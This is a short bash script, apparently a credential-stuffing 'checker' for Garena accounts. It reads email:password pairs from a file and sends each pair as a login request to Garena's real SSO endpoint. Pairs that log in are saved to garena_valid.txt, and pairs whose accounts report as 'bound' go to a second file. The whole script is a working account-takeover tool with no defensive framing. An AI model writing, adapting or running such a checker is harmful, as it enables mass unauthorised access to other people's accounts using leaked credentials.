GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

garena_checker() {
    local email="$1"
    local password="$2"
    echo -e "${YELLOW}[Garena] Checking: ${email}:${password}${NC}"

    response=$(curl -s -X POST "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F%3Flocale_name%3DPH&locale=en-PH" \
        -d "email=${email}" -d "password=${password}" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -w "%{http_code}" -o /dev/null)

    if [[ "$response" == "200" ]]; then
        echo -e "${GREEN}[VALID] Garena Account: ${email}${NC}"
        echo "${email}:${password}" >> garena_valid.txt
    else
        echo -e "${RED}[INVALID] Garena Account: ${email}${NC}"
    fi
}

garena_binder() {
    local email="$1"
    local password="$2"
    echo -e "${YELLOW}[Garena] Checking Bind: ${email}:${password}${NC}"

    response=$(curl -s -X POST "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F%3Flocale_name%3DPH&locale=en-PH" \
        -d "email=${email}" -d "password=${password}" \
        -H "Content-Type: application/x-www-form-urlencoded")

    if echo "$response" | grep -q '"bound":true'; then
        echo -e "${GREEN}[BINDED] Garena Account: ${email}${NC}"
        echo "${email}:${password}" >> garena_bound.txt
    else
        echo -e "${RED}[NOT BINDED] Garena Account: ${email}${NC}"
    fi
}

while IFS=: read -r email password; do
    garena_checker "$email" "$password"
    garena_binder "$email" "$password"
done < Test.txt